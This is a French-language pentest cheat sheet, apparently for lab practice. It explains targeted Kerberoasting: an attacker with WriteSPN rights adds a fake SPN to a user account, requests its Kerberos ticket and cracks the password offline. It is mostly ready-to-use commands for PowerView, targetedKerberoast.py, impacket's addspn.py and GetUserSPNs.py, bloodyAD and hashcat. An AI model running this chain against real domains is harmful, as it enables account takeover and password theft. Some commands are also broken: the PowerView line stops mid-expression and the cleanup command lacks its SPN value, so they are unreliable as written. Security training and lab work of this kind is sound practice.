## **Où WriteSPN entre en jeu**

Si tu as le droit **WriteSPN** (ou GenericWrite/GenericAll, qui l'inclut) sur un compte utilisateur cible, tu peux **toi-même ajouter un SPN arbitraire** à ce compte, même s'il n'en avait pas au départ. Une fois le SPN ajouté, ce compte devient "kerberoastable", même si en théorie c'est un simple compte utilisateur (pas un compte de service).

C'est ce qu'on appelle le **Targeted Kerberoasting**.

**La chaîne d'attaque complète**
1. **Reconnaissance** : tu identifies via BloodHound (ou PowerView) que ton utilisateur courant a WriteSPN (ou équivalent) sur un user cible.
2. **Ajout du SPN** : tu écris un SPN arbitraire (une valeur qui n'existe pas encore dans le domaine, format service/hostname:port) sur l'attribut servicePrincipalName du compte cible.
3. **Demande du ticket TGS** : tu demandes un ticket de service Kerberos pour ce SPN — le KDC te répond avec un ticket chiffré avec le hash NTLM du compte cible.
4. **Extraction et cracking** : tu extrais le ticket (format hashcat/john), et tu tentes de casser le mot de passe offline.
5. **(Nettoyage)** : idéalement tu retires le SPN après, pour rester discret / propre — en pentest réel c'est important, sur HTB moins critique.


### Les commandes 
#### **PowerView** (powershell)
```powershell
Set-DomainObject -Identity <targetuser> -Set @{serviceprincipalname
```

#### Linux 
1. <code class="bg-text-200/5 border border-0.5 border-border-300 text-danger-000 whitespace-pre-wrap rounded-[0.4rem] px-1 py-px text-[0.9rem]">targetedKerberoast.py</code> **(le plus simple, tout-en-un)**

Il détecte automatiquement les comptes sur lesquels tu as les droits, ajoute le SPN, récupère le ticket, et le retire — en une seule commande :

```bash
targetedKerberoast.py -d <domain> -u <user> -p '<password>' -dc-ip <dc_ip>
```
Ça sort direct le hash au format hashcat. Pratique pour un premier passage rapide.

2. addspn.py (impacket) — pour contrôler manuellement l'ajout
```bash
addspn.py -u '<domain>\<user>' -p '<password>' -t <target_user> -s 'fake/whatever01' <dc_ip>
```
- -u : ton compte (celui qui a WriteSPN)
- -t : le compte cible sur lequel tu ajoutes le SPN
- -s : la valeur du SPN arbitraire à écrire

Ensuite tu demandes le ticket TGS avec GetUserSPNs.py :

```bash
GetUserSPNs.py <domain>/<user>:'<password>' -dc-ip <dc_ip> -request-user <target_user>
```
Ça te donne directement le hash Kerberos à cracker.

3. bloodyAD (alternative moderne, bien maintenue)
```bash
bloodyAD --host <dc_ip> -d <domain> -u <user> -p '<password>' set object <target_user> servicePrincipalName -v 'fake/whatever01'
```
Après l'ajout — récupérer le ticket

Si tu n'as pas utilisé targetedKerberoast.py, une fois le SPN posé :

```bash
GetUserSPNs.py <domain>/<user>:'<password>' -dc-ip <dc_ip> -outputfile hashes.txt
```
Puis crack avec hashcat :

```bash
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```
Nettoyage (optionnel mais propre)

Pour retirer le SPN après usage avec addspn.py :

```bash
addspn.py -u '<domain>\<user>' -p '<password>' -r -t <target_user> -s
```
**Pourquoi c'est puissant**

Ça permet de kerberoaster des comptes qui n'auraient normalement jamais été des cibles (pas de SPN natif), du moment que tu as un droit d'écriture sur l'objet. C'est très fréquent dans les configs AD mal durcies où des délégations de droits sont trop larges (souvent via des groupes genre "Help Desk" avec des ACL trop permissives).


